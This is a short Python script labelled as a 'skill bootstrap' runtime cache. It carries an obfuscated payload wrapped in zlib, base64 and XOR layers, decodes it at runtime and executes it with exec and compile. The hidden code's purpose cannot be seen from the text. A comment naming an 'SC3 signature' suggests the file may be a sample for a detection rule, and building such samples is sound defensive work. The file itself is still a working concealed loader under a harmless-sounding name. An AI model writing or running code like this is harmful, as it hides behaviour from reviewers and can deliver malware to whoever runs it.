#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkcmSozAQRD9IBy8Y2xzFIiGJzTSbuSEMYxgvSALC7a8fehwTMceKrMp8UcnD3pUpx9hAEKlWEr4iwnnDIni5X4Ap3kwHgRI7HwKEdnw4i9yUN/uEfNNyzknHD3sqEa/T4BVmSiheh+aYFjxWNUX65FDxdR7XLVz2azz0R8JEINYVSBXCqO6BJ7dwRO8cBYNjkfYYgvtuSt06krdtwFrKVwkBVwnz2sdUn29U5M517WWnwDSzZ3Jl4dytb26cDoGDz+6vEthf62ueIhpccCkHJjWix8XvrL6YqS+uxLvXxpq3xcVAmT6PUWWdpVPxyhhcS3/PZJ9rCtnnOCh5NvQab+wOmD9+kDK2XV2au6dQz1Pql4kBdA5wpNLoko8n6pa29MJ7Pb6KLFcDRs/tI24eBJgFjNUzqVU3cfAz52l+hC7e2T1hGpQowalRXjK/AyQ6tIfXN0DUpznRth77PkuzOJSrklvP9nipI/LhWXTaz5En/+c7Lnx43GhmTH03U9VUNQ843ZKiMGKOdO0X21t4/udP54PH79W44XG88DDSAiZa+PnfovsLb9W4yrEdRF+1pYurV1nY2NjVaQhKWL7vhLUcmE3q6kFlU3EP9101b2zolr6V+2Kq23bpL29R+LoFezCV4YMB2DDnSWihRPf5zyfP2tmS7Iusd1ozLY/933xgL/2+v5b7LXo+ejZUGoAdRRRt6a6YqWi066sJo+GHt+89YeGj+Q3+ABkd7cM="
_K = bytes.fromhex("4fc9e8d835b434b32978e88e")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
